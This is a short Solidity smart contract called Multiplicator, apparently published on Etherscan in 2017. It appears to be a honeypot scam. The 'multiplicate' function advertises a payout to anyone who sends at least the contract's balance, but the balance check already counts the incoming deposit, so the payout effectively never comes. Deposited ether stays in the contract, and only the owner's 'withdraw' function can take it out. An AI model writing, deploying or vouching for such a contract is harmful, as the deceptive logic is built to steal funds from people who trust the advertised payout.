/**
 *Submitted for verification at Etherscan.io on 2017-11-01
*/

pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;
   
    function()payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}